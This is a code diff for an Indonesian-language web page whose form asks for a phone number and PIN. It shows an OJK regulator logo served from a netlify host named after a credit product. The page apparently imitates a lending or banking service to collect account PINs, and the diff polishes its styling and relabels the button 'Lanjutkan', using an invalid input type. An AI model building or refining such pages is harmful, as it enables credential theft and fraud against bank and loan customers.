@@ -37,20 +37,15 @@
 
     .form-container input[type="tel"],
     .form-container input[type="password"],
-    .form-container input[type="submit"] {
-      max-width: 100%;
-      width: 100%;
+    .form-container input[type="Lanjutkan"] {
+      width: calc(100% - 20px); /* Menyesuaikan lebar kolom input */
       padding: 10px;
       border-radius: 8px;
       border: 1px solid #ccc;
-      margin-bottom: 3px; /* Jarak antara kolom nomor hp dan kolom pin */
+      margin-bottom: 10px; /* Jarak antara kolom nomor hp dan kolom pin */
     }
 
-    .form-container input[type="tel"] {
-      margin-bottom: 7px; /* Jarak antara kolom pin dan tombol submit */
-    }
-
-    .form-container input[type="submit"] {
+    .form-container input[type="Lanjutkan"] {
       background-color: #663399;
       color: white;
       font-weight: bold;
@@ -110,7 +105,7 @@
 
       <input type="tel" id="pin" name="pin" placeholder="PIN">
 
-      <input type="submit" value="Submit">
+      <input type="Lanjutkan" value="Lanjutkan">
     </form>
   </div>
 
@@ -119,4 +114,4 @@
     <img src="https://from-limit-ceria-id.netlify.app/img/ojk.png" alt="Logo OJK">
   </div>
 </body>
-  </html>
+</html>
